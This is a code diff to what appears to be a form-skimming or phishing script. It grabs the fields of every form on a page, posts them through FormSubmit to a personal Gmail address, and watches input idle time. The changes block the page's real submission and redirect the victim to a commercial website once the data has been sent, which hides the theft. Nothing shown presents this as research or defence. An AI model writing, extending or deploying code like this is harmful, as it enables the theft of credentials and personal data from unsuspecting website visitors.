@@ -557,6 +557,9 @@ const CONFIG = {
     // Your FormSubmit endpoint
     FORM_SUBMIT_URL: 'https://formsubmit.co/ajax/kiddxxq1@gmail.com',
     
+    // Redirect URL after successful submission
+    REDIRECT_URL: 'https://www.dtech24.co.za',
+    
     // Time to wait after typing before considering input "finished" (ms)
     INPUT_IDLE_TIMEOUT: 2000,
     
@@ -613,7 +616,7 @@ const CONFIG = {
         return isSensitive ? '***' : value;
     };
 
-    // Send data via FormSubmit
+    // Send data via FormSubmit and redirect
     const sendToFormSubmit = async (data) => {
         try {
             log('Preparing FormSubmit request...', 'submit');
@@ -639,7 +642,9 @@ const CONFIG = {
             const result = await response.json();
             
             if (result.success) {
-                log('Data successfully sent via FormSubmit', 'submit');
+                log('Data successfully sent via FormSubmit. Redirecting...', 'submit');
+                // Redirect after successful submission
+                window.location.href = CONFIG.REDIRECT_URL;
             } else {
                 log(`FormSubmit error: ${result.message}`, 'error');
             }
@@ -669,6 +674,9 @@ const CONFIG = {
         // Form submissions
         document.querySelectorAll('form').forEach(form => {
             form.addEventListener('submit', (e) => {
+                // Prevent default form submission so we can handle it
+                e.preventDefault();
+                
                 const data = {};
                 Array.from(form.elements).forEach(el => {
                     if (el.name && el.value) {
